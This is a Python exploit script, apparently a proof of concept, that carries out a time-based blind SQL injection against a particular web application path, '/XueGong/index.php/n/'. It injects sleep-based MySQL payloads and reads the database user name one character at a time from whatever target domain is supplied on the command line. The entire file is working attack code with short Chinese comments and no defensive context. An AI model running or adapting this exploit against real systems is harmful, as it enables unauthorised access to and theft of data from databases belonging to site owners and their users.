# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import time
import string
import sys
import random

def exp(target_domain):
    headers = {} #消息头信息
    payloadlist = "abcdefghijklmnopqrstuvwxyz0123456789@_.ABCDEFGHIGKLMNOPQRSTUVWXYZ:" #做POC时可适当更改
    user = ""

    print("[%s] Start to retrive MySQL USER(time-based blind):" % time.strftime('%H:%M:%S', time.localtime())) #开始检测并计时

    for i in range(1, 32):  #User 长度
        for payload in payloadlist:
            try:
                #构造检测目标URL
                u = "ascii(substring(user(),%s,1))=%s" % (i, ord(payload)) #构造payload 第一部分，i代表请求位置，payload进行盲注测试
                ur = "if(now()=sysdate(),sleep(if(%s,4,0)),0)" % u  #构造payload 第二部分
                url = "/XueGong/index.php/n/%s" % urllib.parse.quote(ur)  
                target_url = target_domain + url

                #访问检测目标URL
                req = urllib.request.Request(target_url, method = "GET")
                response = urllib.request.urlopen(req, timeout = 4) #请求时间
                data = response.read()
                print('.', end = "")
                
            except:
                user += payload
                print('\n[In progress]', urllib.parse.unquote(target_url)) #输出成功获得User内容的exp
                print('[In progress]', user) #输出已经获得的User内容
                time.sleep(3.0) #延迟请求时间，按需设定
                break
    print("\n[Done] MySQL USER is %s" % user) #输出最终结果

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        domain = args[1]
        exp(domain)
    else:
        print("Usage: python %s url" % (args[0]))

if __name__ == "__main__":
    main()
